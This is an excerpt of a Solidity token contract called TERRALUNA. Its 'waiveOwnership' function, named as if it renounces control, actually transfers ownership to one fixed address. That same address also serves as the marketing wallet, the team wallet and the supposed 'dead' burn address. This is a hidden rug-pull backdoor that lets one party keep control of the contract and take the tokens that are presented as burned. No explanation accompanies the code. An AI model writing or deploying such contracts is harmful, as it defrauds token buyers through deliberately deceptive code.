...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x701B0eAEE3B6336D7D1a38545D4f789Cd520B37c));
        _owner = address(0x701B0eAEE3B6336D7D1a38545D4f789Cd520B37c);
    }
...
contract TERRALUNA is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "TERRALUNA";
    string private _symbol = "TERRALUNA";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x701B0eAEE3B6336D7D1a38545D4f789Cd520B37c);
    address payable public teamWalletAddress = payable(0x701B0eAEE3B6336D7D1a38545D4f789Cd520B37c);
    address public immutable deadAddress = 0x701B0eAEE3B6336D7D1a38545D4f789Cd520B37c;
